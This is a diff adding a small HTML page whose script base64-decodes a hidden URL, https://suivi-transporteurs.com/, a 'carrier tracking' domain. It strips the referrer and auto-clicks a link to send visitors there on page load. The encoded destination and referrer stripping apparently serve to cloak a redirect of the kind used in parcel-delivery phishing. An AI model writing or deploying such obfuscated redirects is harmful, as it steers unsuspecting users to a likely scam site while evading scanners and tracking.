@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="referrer" content="no-referrer">
+    <title>Redirection</title>
+</head>
+<body>
+    <script>
+        const b = atob('aHR0cHM6Ly9zdWl2aS0=');
+        const r = atob('dHJhbnNwb3J0ZXVycy5jb20v');
+
+        const a = document.createElement("a");
+        a.href = b + r;
+        a.rel = "noreferrer";
+
+        document.body.appendChild(a);
+
+        a.click();
+    </script>
+</body>
+</html>
